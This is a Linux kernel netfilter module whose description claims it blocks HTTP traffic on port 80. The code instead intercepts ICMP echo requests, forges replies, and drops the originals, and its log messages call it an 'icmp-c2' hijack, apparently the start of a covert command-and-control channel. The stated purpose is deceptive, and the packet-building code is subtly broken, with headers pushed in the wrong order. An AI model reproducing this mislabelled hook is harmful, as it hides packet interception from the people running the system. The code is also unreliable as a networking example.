#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/ktime.h>
#include <linux/jiffies.h>
#include <linux/uaccess.h>
#include <linux/inet.h>
#include <linux/skbuff.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/if_ether.h>
#include <net/ip.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("jackdunf@buffalo.edu");
MODULE_DESCRIPTION("Simple Netfilter module to block HTTP traffic (port 80)");

static struct nf_hook_ops nfho;
unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);

unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *iph;
    struct icmphdr *icmph;
    struct sk_buff *new_skb;
    struct ethhdr *eth, *old_eth;
    unsigned char *data;
    int icmp_payload_len;

    // Ensure it's an IPv4 packet with ICMP
    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_ICMP) {
        return NF_ACCEPT;
    }

    icmph = icmp_hdr(skb);

    // Only process ICMP Echo Requests
    if (icmph->type == ICMP_ECHO) {
        // Calculate ICMP payload length
        icmp_payload_len = ntohs(iph->tot_len) - iph->ihl * 4 - sizeof(struct icmphdr);

        // Allocate a new skb with enough space for Ethernet, IP, ICMP headers, and payload
        new_skb = alloc_skb(LL_MAX_HEADER + sizeof(struct ethhdr) +
                            sizeof(struct iphdr) + sizeof(struct icmphdr) + icmp_payload_len, GFP_ATOMIC);
        if (!new_skb) {
            printk(KERN_ERR "Failed to allocate new skb\n");
            return NF_ACCEPT;
        }

        // Reserve space for headers
        skb_reserve(new_skb, LL_MAX_HEADER);

        // Set up the Ethernet header
        data = skb_push(new_skb, sizeof(struct ethhdr));
        eth = (struct ethhdr *)data;
        old_eth = eth_hdr(skb);

        memcpy(eth->h_dest, old_eth->h_source, ETH_ALEN); // Swap MACs
        memcpy(eth->h_source, old_eth->h_dest, ETH_ALEN);
        eth->h_proto = htons(ETH_P_IP);

        // Set up the IP header
        data = skb_push(new_skb, sizeof(struct iphdr));
        iph = (struct iphdr *)data;

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + icmp_payload_len);
        iph->id = htons(0); // Can set a random ID
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_ICMP;
        iph->saddr = ip_hdr(skb)->daddr; // Source is the original destination
        iph->daddr = ip_hdr(skb)->saddr; // Destination is the original source
        ip_send_check(iph);

        // Set up the ICMP header
        data = skb_push(new_skb, sizeof(struct icmphdr));
        icmph = (struct icmphdr *)data;

        icmph->type = ICMP_ECHOREPLY;
        icmph->code = 0;
        icmph->un.echo.id = icmp_hdr(skb)->un.echo.id;
        icmph->un.echo.sequence = icmp_hdr(skb)->un.echo.sequence;
        icmph->checksum = 0;

        // Copy ICMP payload
        if (icmp_payload_len > 0) {
            skb_put(new_skb, icmp_payload_len);
            memcpy(skb_tail_pointer(new_skb) - icmp_payload_len,
                   (unsigned char *)icmp_hdr(skb) + sizeof(struct icmphdr),
                   icmp_payload_len);
        }

        // Compute ICMP checksum
        icmph->checksum = ip_compute_csum(icmph, sizeof(struct icmphdr) + icmp_payload_len);

        // Set the network device for outgoing packet
        new_skb->dev = state->in; // Use incoming device for reply
        new_skb->protocol = htons(ETH_P_IP);

        // Transmit the packet
        if (dev_queue_xmit(new_skb) < 0) {
            printk(KERN_ERR "Failed to send packet\n");
            kfree_skb(new_skb);
        }

        // Drop the original packet
        return NF_DROP;
    }

    return NF_ACCEPT;
}

// Module initialization
static int __init init_icmp_hijack(void) {
    printk(KERN_INFO "Loading icmp-c2 module...\n");

    // Fill in the nf_hook_ops structure
    nfho.hook = icmp_hijack;                     // Hook function
    // nfho.hooknum = NF_INET_LOCAL_IN;        // Apply to incoming packets
    nfho.hooknum = NF_INET_PRE_ROUTING;        // Going to try to manipulate
    nfho.pf = PF_INET;                          // IPv4
    nfho.priority = NF_IP_PRI_FIRST;            // Set highest priority

    // Register the hook
    nf_register_net_hook(&init_net, &nfho);
    printk(KERN_INFO "icmp-C2 loaded.\n");

    return 0;
}

// Module cleanup
static void __exit exit_icmp_hijack(void) {
    printk(KERN_INFO "Unloading icmp-c2...\n");

    // Unregister the hook
    nf_unregister_net_hook(&init_net, &nfho);
    printk(KERN_INFO "icmp-c2 unloaded.\n");
}

module_init(init_icmp_hijack);
module_exit(exit_icmp_hijack);
